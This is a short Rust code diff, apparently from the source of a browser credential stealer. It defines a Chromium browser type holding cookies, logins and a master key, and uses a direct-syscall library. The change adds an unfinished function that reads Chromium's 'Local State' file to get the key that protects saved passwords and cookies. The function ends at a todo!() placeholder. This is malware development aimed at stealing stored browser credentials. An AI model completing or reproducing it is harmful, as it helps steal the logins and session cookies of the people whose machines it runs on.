@@ -1,7 +1,8 @@
 use alloc::vec::Vec;
+use serde_json::Value;
 use wsyscall_rs::wintypes::WindowsString;
 
-use crate::traits::Browser;
+use crate::{os::fs::read_to_string, traits::Browser};
 
 use super::{Cookie, Login};
 
@@ -21,8 +22,18 @@ impl ChromiumBrowser {
         Ok(ChromiumBrowser {
             user_data_dir,
             // Loki TODO: create function to read master key.
+            
             master_key: Vec::new(),
         })
+    }
+
+    fn read_master_key(mut user_data_dir: WindowsString) -> crate::Result<Vec<u8>> {
+        user_data_dir.push_str("\\Local State");
+        let local_state_string = read_to_string(&user_data_dir)?;
+        let json: Value = serde_json::from_str(&local_state_string)?;
+        
+        todo!()
+
     }
 
     /// Constructs a new Chromium browser from a user data directory.
